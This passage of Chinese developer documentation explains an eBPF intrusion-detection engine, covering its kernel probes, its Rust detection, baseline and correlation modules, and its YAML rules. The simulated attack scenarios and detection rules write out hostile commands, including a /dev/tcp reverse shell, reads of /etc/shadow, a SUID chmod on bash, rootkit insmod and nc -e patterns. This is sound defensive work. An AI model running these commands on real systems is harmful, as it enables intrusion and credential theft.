}
```

同一进程在 30 秒内向不同端口发起 20 次以上连接 → 端口扫描。

#### 数据外泄检测（第 182-205 行）

```c
if (flow->byte_count > 100ULL * 1024 * 1024)  // 超过 100MB
    flow->anomaly_flags |= FLOW_ANOMALY_DATA_EXFIL;
```

单个 TCP 流传输超过 100MB 数据 → 可能是数据窃取。

---

### 文件 A8: `freq_counter.bpf.c` — 行为频率计数器

**路径：** `crates/ks-ebpf/src/bpf/freq_counter.bpf.c`

**作用：** 维护每个进程在 60 秒滑动窗口内的各维度操作频率，超过阈值立即告警。

#### 频率计数器结构（第 7-13 行）

```c
struct freq_counter {
    u32 syscall_count_60s;    // 60 秒内系统调用次数
    u32 file_op_count_60s;    // 文件操作次数
    u32 net_op_count_60s;     // 网络操作次数
    u32 dns_op_count_60s;     // DNS 查询次数
    u32 ptrace_count_60s;     // ptrace 次数
    u32 signal_count_60s;     // 信号发送次数
    u64 last_update_ns;       // 最后更新时间
    u64 window_start_ns;      // 当前窗口起始时间
    u32 anomaly_flags;        // 异常标记
};
```

#### 频率阈值（第 103-112 行）

```c
if (fc->file_op_count_60s  > 500)   fc->anomaly_flags |= FREQ_ANOMALY_RANSOMWARE;
if (fc->net_op_count_60s   > 100)   fc->anomaly_flags |= FREQ_ANOMALY_PORT_SCAN;
if (fc->dns_op_count_60s   > 50)    fc->anomaly_flags |= FREQ_ANOMALY_DNS_TUNNEL;
if (fc->syscall_count_60s  > 10000) fc->anomaly_flags |= FREQ_ANOMALY_BRUTE_FORCE;
if (fc->ptrace_count_60s   > 3)     fc->anomaly_flags |= FREQ_ANOMALY_INJECTION;
```

| 异常类型 | 阈值（60秒内） | 典型攻击场景 |
|---------|---------------|-------------|
| 勒索软件 | 文件操作 > 500 次 | 批量加密文件 |
| 端口扫描 | 网络操作 > 100 次 | 扫描开放端口 |
| DNS 隧道 | DNS 查询 > 50 次 | 通过 DNS 传数据 |
| 暴力破解 | 系统调用 > 10000 次 | 密码枚举 |
| 进程注入 | ptrace > 3 次 | 调试附加/代码注入 |

#### 窗口滑动机制（第 85-91 行）

```c
u64 elapsed = now - fc->window_start_ns;
if (elapsed > window_ns) {  // 60 秒窗口过期
    // 清空所有计数器，开始新窗口
    fc->syscall_count_60s = 0;
    fc->window_start_ns = now;
    fc->anomaly_flags = 0;
}
```

如果距离窗口开始时间超过 60 秒，说明窗口已过期，重置所有计数器。这是一个**固定窗口**（不是滑动窗口），实现简单但够用。

---

### 文件 A9: `ks_probes_smart_filter.h` — 智能过滤器

**路径：** `crates/ks-ebpf/src/bpf/ks_probes_smart_filter.h`（早期版本是独立 `smart_filter.bpf.c`）

**作用：** 在真正发送事件到 ring buffer 之前做决策——低风险事件被抑制（不发送），高风险事件放行。

#### 决策函数 `should_send_event`

⚠️ **语义陷阱**：函数名是 `should_send_event`，但返回的 `decision.action` 含义是 **"是否抑制"**——
`action=1` → **丢弃**事件，`action=0` → **放行**（`ks_should_drop` 直接 `return d.action`）。读代码别被名字骗了。

（2026-08-30 重构后的完整决策链，按序短路）

1. **白名单**：进程在 `process_whitelist` → 丢弃（reason=WHITELIST）。
2. **安全模式**：事件 10-12 且 (comm, path_prefix) 命中 `safe_patterns` → 丢弃（reason=SAFE_PATTERN）。
3. **风险分**：`risk_scores[pid] >= 40` → 放行。
4. **频率异常**：`freq_counters[pid].anomaly_flags > 0` → 放行。
5. **默认策略**：`FILE_OPEN(10)/FILE_READ(11)` → 丢弃（有 freq 记 NORMAL_FREQ / 无 freq 记 LOW_RISK）；**其余事件类型默认放行**（exec/connect/ptrace/signal 等）。

#### 为什么需要智能过滤器？

eBPF events ringbuf 是**共享资源**。如果每个文件打开事件都发到用户态，每秒可能产生数十万条事件，ring buffer 很快撑爆，用户态也处理不过来。

过滤目标是"把低价值高频的文件 open/read 事件拦在内核，其余事件留给用户态检测"。⚠️ 早期"目标过滤率 80%"的旧策略已被 8-30 重构替换（旧版对所有高频低风险 PID 一律丢弃，丢失了 exec/connect 事件；新版仅过滤文件 open/read，其余放行）。注意：`vfs_open` kprobe 只做过滤统计（update_filter_stats），不产出事件本身；其他 vfs/net kprobe 路径不经过过滤（只有 sys_exit tracepoint 路径受控）。

---

## 第 B 组：用户态引擎（ks-engine/src/*.rs）

### 文件 B1: `config.rs` — 配置管理

**路径：** `crates/ks-engine/src/config.rs`

**作用：** 管理项目的所有配置项，支持 YAML 文件加载 + 环境变量覆盖 + 校验。

#### 配置结构体层次

```rust
pub struct Config {
    pub engine: EngineConfig,           // 引擎参数
    pub detection: DetectionConfig,     // 检测参数
    pub forensic: ForensicConfig,       // 取证日志参数
    pub network: NetworkConfig,         // 网络服务参数
    pub performance: PerformanceConfig, // 性能参数
}
```

每个子配置都有内置默认值，通过 `#[serde(default)]` 自动填充。这意味着用户不需要写任何配置文件就能启动。

#### 配置来源优先级（从低到高）

```
内置默认值 < YAML 配置文件 < KS_* 环境变量
```

环境变量命名规则：`KS_<SECTION>_<KEY>`，例如：
- `KS_ENGINE_BUFFER_SIZE=20000` — 覆盖环形缓冲大小
- `KS_DETECTION_ANOMALY_THRESHOLD=0.8` — 覆盖异常评分阈值
- `KS_FORENSIC_RETENTION_DAYS=60` — 覆盖日志保留天数

---

### 文件 B2: `event_source.rs` — 事件源抽象 + 6 个攻击模拟

**路径：** `crates/ks-engine/src/event_source.rs`

**作用：** 定义 `EventSource` trait（特征），统一了三种数据源的接口：eBPF ring buffer、Mock 模拟数据、文件回放。

#### EventSource trait（第 6-10 行）

```rust
pub trait EventSource: Send + Sync {
    fn next_bytes(&mut self) -> Result<Option<Vec<u8>>>;  // 获取下一个事件
    fn description(&self) -> &str;                         // 事件源描述
    fn is_mock(&self) -> bool;                             // 是否是 Mock 数据
}
```

不同的事件源实现这个 trait 后，上层的引擎代码完全不需要知道数据来自哪里。

#### 6 个攻击模拟场景（第 50-188 行）

**场景 1: 反弹 Shell（第 50-69 行）**

```rust
fn reverse_shell_scenario(base_ns: u64) -> Vec<Vec<u8>> {
    vec![
        // 事件 1: bash 执行，参数 "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
        ExecEvent { header: { event_type: 1, pid: 1234, comm: "bash", syscall_nr: 59 }, ... },
        
        // 事件 2: TCP 连接 10.0.0.1:4444
        NetEvent { header: { event_type: 20, pid: 1234, ...}, dport: 4444, ... },
        
        // 事件 3: 读取 /etc/shadow
        FileEvent { header: { event_type: 10, pid: 1234, ...}, filename: "/etc/shadow" },
        
        // 事件 4: 进程退出
        EventHeader { event_type: 2, pid: 1234, ... },
    ]
}
```

**场景 2: 勒索软件（第 71-97 行）**

4 个写入 `.encrypted` 文件 + 4 个删除原文件 + 1 个勒索信：

```
时间轴: 0s → encryptor 启动
        50ms → 写 report.pdf.encrypted
        100ms → 写 budget.xlsx.encrypted
        150ms → 写 img001.jpg.encrypted
        200ms → 写 img002.jpg.encrypted
        250ms → 删 report.pdf
        300ms → 删 budget.xlsx
        350ms → 删 img001.jpg
        400ms → 删 img002.jpg
        500ms → 写 README_FOR_DECRYPT.txt（勒索信）
```

**场景 3: 提权攻击（第 99-123 行）**

```
事件 1: chmod +s /bin/bash（设置 SUID）
事件 2: 修改 /bin/bash 权限
事件 3: 写入 /etc/sudoers（把自己加进 sudo 白名单）
事件 4: LD_PRELOAD=/tmp/malicious.so（劫持动态库）
事件 5: ptrace 附加到 PID 1（进程注入）
```

**场景 4: DNS 隧道（第 125-143 行）**

```
事件 1: dnstunnel 启动
事件 2-6: 每秒一次 DNS 查询（UDP 端口 53），目标依次是 8.8.8.8、8.8.4.4、1.1.1.1...
```

**场景 5: Rootkit（第 145-164 行）**

```
事件 1: insmod /tmp/rootkit.ko（加载恶意内核模块）
事件 2: 读 /proc/kallsyms（查找内核符号地址）
事件 3: 写入 /boot/grub/grub.cfg（修改引导配置）
事件 4: kill -9 100（杀掉安全进程）
```

**场景 6: 基线（第 167-188 行）**

```
事件 1: ls -la /home（正常的进程执行）
事件 2: cat /etc/hosts（正常的文件读取）
事件 3: wget https://example.com/pkg.tar.gz（正常的网络下载）
事件 4: TCP 连接到 example.com:443（正常的网络连接）
```

这个场景是模拟"正常行为"，用于测试基线检测不会对正常操作误报。

---

### 文件 B3: `aggregator.rs` — 事件聚合器

**路径：** `crates/ks-engine/src/aggregator.rs`

**作用：** 从 ring buffer 读取裸字节，解码为 `DecodedEvent` 结构体，存入环形缓冲区。

#### 数据结构

```rust
pub struct DecodedEvent {
    pub seq: u64,                    // 事件序列号（从 1 递增）
    pub header: EventHeader,         // 原始头部（64 字节）
    pub comm: String,                // 进程名（从 C 字符串转 Rust String）
    pub filename: Option<String>,    // 文件名（exec/file 事件有）
    pub args: Option<String>,        // 命令行参数（exec 事件有）
    pub saddr: Option<String>,       // 源 IP 地址
    pub daddr: Option<String>,       // 目标 IP 地址
    pub sport: Option<u16>,          // 源端口
    pub dport: Option<u16>,          // 目标端口
    pub proto: Option<String>,       // 协议（"TCP"/"UDP"）
    pub target_pid: Option<u32>,     // 目标进程 ID（signal 事件有）
    pub signal: Option<i32>,         // 信号编号（signal 事件有）
    pub file_bytes: Option<u64>,     // 文件字节数（file 事件有）
}
```

使用 `Option` 表示可选字段是因为不同类型的事件包含不同的信息。例如，网络事件有 `daddr` 和 `dport`，进程事件没有。

#### decode 方法详解（第 38-126 行）

```rust
pub fn decode(&mut self, data: &[u8]) -> Result<DecodedEvent> {
    // 第 1 步: 从裸字节中解析 RawEvent（两阶段越界校验）
    let raw = unsafe { RawEvent::from_bytes(data) }?;
    
    // 第 2 步: 根据 event_type 分发到不同的解析逻辑
    match event_type {
        1 => /* ExecEvent 解析: filename + args */,
        10..=15 => /* FileEvent 解析: filename + bytes */,
        20..=24 => /* NetEvent 解析: IP+端口+协议 */,
        30 | 31 => /* SignalEvent 解析: target_pid + signal */,
        2 | 3 => /* 只有 header，没有额外数据 */,
    }
    
    // 第 3 步: 分配序列号并存入环形缓冲区
    self.seq += 1;
    self.buffer.push_back(event);
    
    Ok(event)
}
```

#### 环形缓冲区（第 119-122 行）

```rust
if self.buffer.len() >= self.max_buffer {
    self.buffer.pop_front();  // 满了就从前面淘汰
}
self.buffer.push_back(event.clone());  // 新事件加到后面
```

`VecDeque` 是 Rust 的双端队列，从头部淘汰是 O(1) 操作。

#### 查询功能

- `by_pid(pid)` — 查找指定 PID 的所有事件
- `recent(n)` — 获取最近 N 条事件
- `by_time_range(start, end)` — 按时间范围搜索

---

### 文件 B4: `loader.rs` — eBPF 加载器

**路径：** `crates/ks-engine/src/loader.rs`

**作用：** 管理 eBPF 程序的加载和生命周期。

**当前状态：** 已经是真实实现——Linux 上 attach 16 个探针程序（5 tracepoint + 11 kprobe，宏展开硬编码列表），
消费 5 个 ringbuf（events/tree_events/freq_events/flow_events/filter_events；legacy/ancient 走 PerfEventArray），
并注入保护名单（`inject_protected_pid`：自身+祖先链≤8跳+pid1；`inject_protected_comms`：11 默认+KS_PROTECTED_COMMS），
`KS_ENFORCE=1` 时写 infer_config[5/6/7]。早期"start_all()/stop_all() 空操作"的说法已过时。
⚠️ 注意：`ProbeConfig`/`ProbeState` 枚举仍存在，但 attach 由宏硬编码驱动，并未由 ProbeConfig 配置。

`BpfMapReader` trait（已在 Linux 实现）定义了读取 BPF map 的接口：
```rust
pub trait BpfMapReader: Send + Sync {
    fn read_map(&self, map_name: &str) -> anyhow::Result<MapSnapshot>;
    fn read_map_structured(&self, map_name: &str) -> Vec<serde_json::Value>; // 默认空
    fn list_maps(&self) -> Vec<String>;
    fn list_map_stats(&self) -> Vec<MapStat>;
}
```
- `MockBpfMapReader`：非 Linux/降级路径的 6+6 map 桩数据。
- `LinuxBpfMapReader`：aya `MapData::info()` 真实读取 6 个共享 map（risk_scores/ip_whitelist/net_conn_history/freq_counters/infer_config/protected_comms），typed K/V `#[repr(C)]` 读取，供 /api/v1/stats 与 /api/v1/maps/:name。

---

### 文件 B5: `detector.rs` — 检测引擎

**路径：** `crates/ks-engine/src/detector.rs`

**作用：** 两种检测模式叠加：规则匹配（确定性）+ 异常评分（统计性）。

#### 模式一：规则匹配

**工作原理：** YAML 规则 → 反序列化为 `DetectionRule` → 遍历规则 → AND 条件匹配 → 返回 `Vec<MatchResult>`

**关键函数调用链：** `match_event`（第 32 行）→ 遍历规则 → `rule_matches`（第 49 行）→ AND 条件 → `condition_matches`（第 53 行）→ 分派到 `match_str`/`match_u32`/`match_opt_u32`

`rule_matches`（第 49-51 行）：
```rust
fn rule_matches(&self, rule: &DetectionRule, event: &DecodedEvent) -> bool {
    rule.conditions.iter().all(|cond| self.condition_matches(cond, event))
    // .all() = AND 关系，所有条件都要满足
}
```

`condition_matches`（第 53-78 行）根据字段类型分发：
```rust
fn condition_matches(&self, cond: &Condition, event: &DecodedEvent) -> bool {
    match &cond.field {
        Field::Pid => match_u32(event.header.pid, &cond.operator, &cond.value),
        Field::Comm => match_str(&event.comm, &cond.operator, &cond.value),
        Field::Filename => match_opt_str(event.filename.as_deref(), ...),
        Field::Dport => match_opt_u32(event.dport.map(|v| v as u32), ...),
        Field::Args => match_opt_str(event.args.as_deref(), ...),
        ...
    }
}
```

#### 模式二：异常评分

**文件：** 同一文件，`anomaly_score` 方法（第 152-226 行）

给每个事件打 0.0-1.0 的分数，多维度累加（⚠️ 现签名已从 history 切片改为 `anomaly_score(event, recent_syscalls: u32)`——频率维度由 aggregator 的 pid_windows 60s 窗口计数提供，不再遍历历史事件）：

```rust
pub fn anomaly_score(&self, event: &DecodedEvent, recent_syscalls: u32) -> f64 {
    let mut score = 0.0;
    
    // 维度 1: 系统调用频率（60s 窗口计数）
    if recent_syscalls > 500 { score += 0.4; }
    else if recent_syscalls > 100 { score += 0.2; }
    
    // 维度 2: 敏感文件访问（三档，只取最高命中档）
    //   高敏感 /etc/shadow,/root/.ssh,/etc/ssl/private,/root/.gnupg → +0.5
    //   中敏感 /etc/passwd,/etc/sudoers,/etc/crontab,/etc/ssh/sshd_config → +0.35
    //   低敏感 /var/log,/proc/,/etc/hosts → +0.15
    
    // 维度 3: 可疑命令特征（comm/args 命中即 break）
    if comm contains "bash -i" { score += 0.5; }
    if args contains "chmod +s" { score += 0.4; }
    if args contains "nc -e"   { score += 0.5; }
    // ...
    
    // 维度 4: 勒索软件扩展名
    if filename contains ".encrypted" { score += 0.4; }
    
    // 维度 5: 异常网络连接
    if dport in [4444, 1337, ...] { score += 0.5; }
    if !is_private_ip(daddr) { score += 0.1; }
    
    score.min(1.0)  // 上限 1.0
}
```

#### 告警生成（`generate_alert` 第 82-149 行）

当规则命中后，从 `MatchResult` 生成 `Alert` 结构体，包含：
- 进程信息（PID、PPID、进程名、路径、命令行）
- 网络信息（五元组）
- 文件信息（路径、操作类型）
- MITRE ATT&CK 编号

---

### 文件 B6: `baseline.rs` — 基线偏离检测

**路径：** `crates/ks-engine/src/baseline.rs`

**作用：** 为每个进程建立"正常行为基线"，用 z-score 统计学方法检测偏离。

#### 工作流程

```
阶段 1: 收集（前 5 个 60 秒窗口）
  每个窗口记录: syscall 次数、文件操作次数、网络连接次数、... 
  
阶段 2: 建立基线（第 5 个窗口结束时）
  计算每个维度的 均值(mean) 和 标准差(stddev)
  锁定基线，进入检测阶段（established_pids）
  
阶段 3: 检测（之后每个窗口）
  当前值 → 计算 z-score = (当前值 - 均值) ÷ 标准差
  z-score > 2 → 轻度偏离
  z-score > 3 → 中度偏离
  z-score > 4 → 严重偏离
  z-score ≥ 5 → 极度偏离
```

#### z-score 计算（`calc_baseline` 第 191-198 行）

```rust
fn calc_baseline(values: impl Iterator<Item = f64>) -> StatBaseline {
    let vals: Vec<f64> = values.collect();
    let n = vals.len() as f64;
    let mean = vals.iter().sum::<f64>() / n;             // 均值
    let variance = vals.iter().map(|v| (v - mean).powi(2)).sum::<f64>() / n;  // 方差
    StatBaseline { mean, stddev: variance.sqrt(), max: ... }  // 标准差 = 方差开方
}
```

#### 偏离检测（`detect_deviation` 第 153-185 行）

```rust
pub fn detect_deviation(&self, pid: u32) -> Option<DeviationResult> {
    let current = 当前窗口的快照;
    let baseline = 该进程的基线;
    
    // 对 6 个维度分别计算 z-score
    for (dim, val, baseline, fixed_threshold) in &dims {
        let z = if baseline 存在 {
            if baseline.stddev > 0 {
                (val - baseline.mean) / baseline.stddev  // z-score
            } else if val > baseline.mean { 3.0 } else { 0.0 }
        } else if val > fixed_threshold { 5.0 }  // 无基线时用固定阈值
          else { 0.0 };
        
        if z > 2.0 { deviations.push(偏离记录); }
    }
    if deviations.is_empty() { return None; }
    Some(DeviationResult { 总体分数, 最偏离维度 })
}
```

#### 严重程度分级（`classify_severity` 第 200-202 行）

| z-score | 严重程度 |
|--------|---------|
| < 2.0 | Normal（正常） |
| 2.0-3.0 | Low（轻度） |
| 3.0-4.0 | Medium（中度） |
| 4.0-5.0 | High（高度） |
| ≥ 5.0 | Critical（严重） |

#### 特殊处理：固有高频进程（第 56-60 行）

```rust
const INHERENTLY_HIGH_FREQ: &[&str] = &[
    "wget", "curl", "python", "python3", "node", "java",
    "chrome", "firefox", "nginx", "apache2", "httpd",
    "postgres", "mysql", "redis-server", "mongod",
    "systemd", "sshd", "cron",
];  // 共 18 个 comm 子串
```

这些进程天生操作频繁（Web 服务器、数据库），它们的基线会自动包含高频率，所以不会因正常高频操作误报。`is_inherently_high_freq` 仅作为标记供上层判级参考，本身不自动放宽阈值。

---

### 文件 B7: `correlation.rs` — 跨事件关联分析

**路径：** `crates/ks-engine/src/correlation.rs`

**作用：** 检测单个事件看不出来、但多个事件组合起来就是攻击的行为模式。

#### 两种关联模式

**窗口关联（Window）：** 事件 A 发生后 N 秒内出现事件 B，且两事件满足各自的条件。

```rust
CorrelationType::Window {
    window_secs: 30,
    condition_a: 读 /etc/shadow,
    condition_b: 外连 4444 端口,
}
// 触发: 30 秒内读 /etc/shadow → 外连 4444 端口 → 告警
```

**序列关联（Sequence）：** 按顺序出现事件 A → B → C，且间隔不超过最大时间。

```rust
CorrelationType::Sequence {
    steps: [读文件, 写.encrypted, 删原文件],
    max_gap_secs: 10,
}
// 触发: 10 秒内 读 → 写.encrypted → 删原文件 → 告警（勒索软件）
```

#### 6 条预设规则（`default_rules` 第 81-178 行）

| 规则名 | 类型 | 时间窗口 | 条件 A | 条件 B/C |
|--------|------|---------|--------|---------|
| 数据窃取: 读敏感文件后外连 | 窗口 | 30s | 读/etc/shadow | 外连4444端口 |
| 数据窃取: 读 SSH 密钥后外连 | 窗口 | 60s | 读.ssh | 建立连接 |
| 勒索软件: 读→加密写→删 | 序列 | 10s | 读文件 | 写.encrypted → 删 |
| 反弹 Shell: bash -i 后外连 | 窗口 | 5s | bash -i | TCP 连接 |
| 提权: SUID 后改 sudoers | 序列 | 60s | chmod +s | 写/etc/sudoers |
| DNS 隧道: 高频 DNS | 窗口 | 60s | DNS 查询 | 再次 DNS 查询 |

#### 置信度计算

窗口关联（第 243-248 行）：
```rust
let mut confidence = 0.6;            // 基础置信度
if same_pid { confidence += 0.2; }   // 同一进程 → 更可信
if matched.len() >= 2 { confidence += 0.1; }  // 多次匹配 → 更可信
```

序列关联（第 283-288 行）：
```rust
let mut confidence = 0.7;            // 基础置信度
if duration < 3_000_000_000 { confidence += 0.2; }  // 3 秒内完成 → 更可信
```

---

### 文件 B8: `chain.rs` — 攻击链还原

**路径：** `crates/ks-engine/src/chain.rs`

**作用：** 将孤立的事件串起来，按 MITRE ATT&CK 框架分类，还原攻击者的完整操作序列。

#### 10 个攻击阶段（第 11-23 行）

```rust
pub enum AttackPhase {
    InitialAccess,       // 初始入侵 (TA0001)
    Execution,           // 执行 (TA0002)
    Persistence,         // 持久化 (TA0003)
    PrivilegeEscalation, // 权限提升 (TA0004)
    DefenseEvasion,      // 防御规避 (TA0005)
    CredentialAccess,    // 凭据访问 (TA0006)
    Discovery,           // 发现 (TA0007)
    LateralMovement,     // 横向移动 (TA0008)
    Exfiltration,        // 数据窃取 (TA0010)
    Unknown,             // 未知
}
```

#### 事件分类逻辑（`classify_phase` 第 93-137 行）

每个事件根据进程名、参数、文件名等特征归类到某个攻击阶段：

```
bash -i / nc -e → InitialAccess
wget / curl / python -c → Execution
写 crontab / systemd → Persistence
chmod +s / sudo / LD_PRELOAD → PrivilegeEscalation
ptrace / rm -rf /var/log → DefenseEvasion
读 /etc/shadow → CredentialAccess
find /etc / ls /proc → Discovery
dport 4444/1337/31337 → Exfiltration
```

#### 攻击链重建（`reconstruct` 第 50-91 行）

```rust
pub fn reconstruct(&self, events: &[DecodedEvent]) -> Option<AttackChain> {
    let base_ns = events[0].header.timestamp_ns;
    
    for event in events {
        // 300 秒时间窗口过滤（太旧的事件不考虑）
        if event.timestamp_ns - base_ns > 300_000_000_000 { continue; }
        
        let phase = Self::classify_phase(event);
        if phase != Unknown {
            // 相邻的相同阶段合并（减少冗余）
            if last.phase == phase {
                last.events.push(event.seq);
            } else {
                steps.push(AttackStep { phase, description, events: vec![event.seq], ... });
            }
        }
    }
}
```

#### 置信度计算（第 80-88 行）

```rust
let mut confidence = (steps.len() as f64 * 0.15).min(0.8);
// 包含高危阶段（初始入侵/提权/数据窃取）→ +0.2
if has_high_risk { confidence = (confidence + 0.2).min(1.0); }
// 事件数少但阶段多 → 置信度打六折（可能是误报）
if total_events < 3 && phase_count >= 3.0 { confidence *= 0.6; }
```

| 阶段数 | 基准 | 含高危阶段 | 最终置信度 |
|--------|------|-----------|-----------|
| 1 | 0.15 | +0.2 | 0.35 |
| 2 | 0.30 | +0.2 | 0.50 |
| 3 | 0.45 | +0.2 | 0.65 |
| 4 | 0.60 | +0.2 | 0.80 |
| 5+ | 0.75 | +0.2 | 0.95 |

攻击阶段越多，置信度越高——越复杂的攻击行为越不容易误报。

---

### 文件 B9: `process_tree.rs` — 进程树管理

**路径：** `crates/ks-engine/src/process_tree.rs`

**作用：** 在用户态重建进程拓扑，通过异常父子关系检测、BFS 遍历家族、攻击链升级。

#### 与内核态 process_tree.bpf.c 的关系

| 层次 | 维护 | 检测能力 | 优点 |
|------|------|---------|------|
| 内核态 | process_tree.bpf.c | 精确匹配"bash→nc"等预设模式 | 实时性高，纳秒级检测 |
| 用户态 | process_tree.rs | BFS 家族遍历+异常关系+链还原 | 检测复杂，可做任意分析 |

#### 异常父子关系定义（第 66-75 行）

```rust
fn default_anomaly_patterns() -> Vec<AnomalyPattern> {
    vec![
        AnomalyPattern { parent: "bash", child: "wget",    desc: "Shell下载文件，可能是payload" },
        AnomalyPattern { parent: "bash", child: "nc",      desc: "Shell执行网络工具，疑似反弹Shell" },
        AnomalyPattern { parent: "bash", child: "insmod",  desc: "Shell加载内核模块，疑似Rootkit" },
        AnomalyPattern { parent: "bash", child: "sudo",    desc: "Shell调sudo提权" },
        AnomalyPattern { parent: "sshd", child: "bash",    desc: "SSH会话启动Shell（多数情况下正常）" },
        AnomalyPattern { parent: "cron", child: "nc",      desc: "定时任务执行nc，疑似C2" },
    ]
}
```

#### BFS 家族遍历（`get_family` 第 116-154 行）

```rust
pub fn get_family(&self, root_pid: u32) -> Option<ProcessFamily> {
    let mut queue = vec![root_pid];
    let mut member_pids = HashSet::new();
    
    while let Some(pid) = queue.pop() {
        member_pids.insert(pid);
        let node = self.nodes.get(&pid);
        
        // 收集该进程的异常关系
        for pattern in &self.anomaly_patterns {
            if pc.contains(&pattern.parent_comm) && node.comm.contains(&pattern.child_comm) {
                anomaly_relations.push(AnomalyRelation{...});
            }
        }
        
        // 把子进程加入队列（继续遍历）
        for child in &node.children { queue.push(*child); }
    }
}
```

BFS（广度优先搜索）从根进程开始，一层一层往下遍历所有子进程，收集完整家族成员。

---

### 文件 B10: `forensic.rs` — 取证日志

**路径：** `crates/ks-engine/src/forensic.rs`

**作用：** 所有事件和告警写入 JSONL 格式日志，带 SHA-256 哈希链防篡改。

#### 哈希链原理

```
初始状态:
  GENESIS_HASH = "0000...000"（64 个 0，第 53 行）

写入第 1 条:
  { "event_type": 1, "pid": 1234, "prev_hash": "0000...000", "hash": "a1b2...c3" }
                                                                 └──────┬─────┘
                                                                   SHA256(内容)
写入第 2 条:
  { "event_type": 2, "pid": 5678, "prev_hash": "a1b2...c3", "hash": "d4e5...f6" }
                                    └──────┬─────┘
                                      = 上一条的 hash
写入第 3 条:
  { "event_type": 10, ..., "prev_hash": "d4e5...f6", "hash": "g7h8...i9" }
```

如果攻击者改动了第 2 条的任何字段：
1. 第 2 条的 hash 变了（不再是 "d4e5...f6"）
2. 第 3 条的 prev_hash 还是 "d4e5...f6"
3. 验证时发现 mismatch → 链断裂 → 检测到篡改

#### 所以需要 BTreeMap 保证 key 顺序一致

第 162-165 行：用 `BTreeMap` 重排 JSON 的 key。因为 SHA-256 对字节敏感，如果 JSON 的 key 顺序在不同序列化时不同，同一个对象会产生不同的 hash。`BTreeMap` 保证 key 按字母序排列，确保确定性。

#### 日志轮转（第 109-136 行）

```
当前文件达到 100MB
    → flush 缓冲
    → 重命名为 events_20240101_120000.jsonl
    → 创建新文件继续写
    → 异步 gzip 压缩旧文件（events_20240101_120000.jsonl.gz）
    → 自动删除 30 天前的归档
```

#### 链完整性验证（`verify_chain` 第 219-258 行）

从头读取日志文件，逐行验证：
1. 当前行的 `prev_hash` == 上一行存储的 hash？
2. 当前行的 `hash` == 重算（去掉 hash 和 prev_hash 后的内容）结果？

全通过 → `ChainVerification { is_valid: true }`
有断裂 → `ChainVerification { is_valid: false, broken_at: 第 N 条 }`

---

## 第 C 组：规则文件 (rules/*.yml)

规则可热加载——检测引擎在运行时检测到文件变更，自动替换规则集（`loader.rs` 中的 5 秒扫描）。

### 文件 C1: `reverse_shell.yml` — 反弹 Shell 检测

2 条规则：

| 规则名 | 触发条件 | 严重程度 |
|--------|---------|---------|
| 反弹Shell检测 | comm contains "bash" AND args regex "(-i\|/dev/tcp)" | critical |
| Netcat反弹Shell | comm regex "(nc\|ncat)" AND args regex "(-e\|-c)" | critical |

### 文件 C2: `ransomware.yml` — 勒索软件检测

2 条规则：

| 规则名 | 触发条件 | MITRE |
|--------|---------|-------|
| 勒索软件加密行为 | filename regex ".(encrypted\|locked\|crypto\|ryuk\|wanna\|cerber)$" | TA0040/T1486 |
| 敏感文件访问 | filename contains "/etc/shadow" | TA0006/T1003.008 |

### 文件 C3: `privilege_escalation.yml` — 权限提升检测

6 条规则：

| 规则名 | 触发条件 | 严重程度 |
|--------|---------|---------|
| SUID 提权检测 | comm = "chmod" AND args regex "(+s\|u+s\|4755)" | critical |
| ptrace 进程注入 | syscall_nr = 101 | critical |
| sudo 配置篡改 | filename contains "/etc/sudoers" | critical |
| LD_PRELOAD 劫持 | args contains "LD_PRELOAD" | high |
| 内核模块加载 | comm regex "(insmod\|modprobe)" | high |
| Cron 持久化 | filename regex "^/etc/cron(tab\|.d/)" | high |

### 文件 C4: `dns_tunnel.yml` — DNS 隧道检测

1 条规则：

| 规则名 | 条件 | 作用 |
|--------|------|------|
| DNS 隧道检测 | proto=UDP AND dport=53 | 标记单次 DNS 事件；频率偏离维度由 baseline 的 dns 固定阈值（60s >50 次 → z=5）和内核频次计数覆盖 |

注意：DNS 隧道的精确检测两个维度缺一不可——规则引擎标记单次事件，异常评分/基线引擎检测频率偏离。

### 文件 C5: `rootkit_detect.yml` — Rootkit 检测

5 条规则：

| 规则名 | 条件 | 检测目标 |
|--------|------|---------|
| rootkit_module_load | comm = "insmod" | 内核模块加载 |
| rootkit_finit_module | syscall_nr = 313 | finit_module 系统调用 |
| rootkit_proc_anomaly | /proc/[pid]/(maps\|mem) + python/perl/bash | /proc 异常扫描 |
| rootkit_syscall_table_modify | /boot/(vmlinuz\|System.map\|config) | 内核符号表访问 |
| rootkit_hidden_process_kill | signal=9 AND comm regex "(kill\|pkill\|skill)" | 异常 SIGKILL |

### 文件 C6: `data_exfil.yml` — 数据窃取检测

3 条规则：

| 规则名 | 条件 | 检测目标 |
|--------|------|---------|
| 敏感日志文件访问 | /var/log/(auth\|secure\|syslog\|audit) | 数据窃取准备阶段 |
| 非私有IP外连高危端口 | 非私有IP AND dport in (4444,1337,...) | 外传通道 |
| 大文件外传可疑连接 | file_bytes > 1MB AND 非私有IP daddr | 大文件外传 |

### 文件 C7: `container-escape.yml` / `lkm-load.yml` / `ebpf-tamper.yml` — 三个安全探针规则（E4）

| 文件 | 条数 | 条件 | 说明 |
|------|------|------|------|
| container-escape.yml | 1 | event_type=80 AND comm regex "(runc\|docker\|containerd\|setns\|unshare\|podman\|crio)" | commit_creds 容器逃逸（critical, T1611） |
| lkm-load.yml | 2 | event_type=81 + module_name/comm 过滤 | do_init_module 与 finit_module 双通道内核模块加载（T1547.006） |
| ebpf-tamper.yml | 1 | event_type=82 AND action=free | security_bpf_prog_free 自身防护（T1070） |

---

## 第 D 组：脚本与集成测试

### 文件 D1: `scripts/setup_dev.sh` — 开发环境搭建

一键安装开发所需的全部依赖：
1. 系统依赖：clang、llvm、libelf、linux-headers
2. Rust 工具链 + bpf-linker
3. BPF 工具：bpftool、linux-tools
4. 验证环境

### 文件 D2: `scripts/build.sh` — 完整编译脚本

> 当前构建入口：`cargo build --release`（触发 ks-engine/build.rs 的 5 tier 编译矩阵：clang-18 优先，
> `ks_main.bpf.c` 按 modern/legacy/ancient/ancient_nobtf/legacy_nobtf 编译为 5 个 .o，nobtf 两 tier 自动剥离
> .BTF.ext，随后 cc 预编静态 ks_loader，全部 `include_bytes!` 内嵌进二进制）。`scripts/build.sh` 为辅助脚本（实际矩阵在 build.rs）。

### 文件 D3: `integration_test.rs` / `e2e_attacks.rs` — 集成测试

**路径：** `crates/ks-engine/tests/integration_test.rs` + `crates/ks-engine/tests/e2e_attacks.rs`

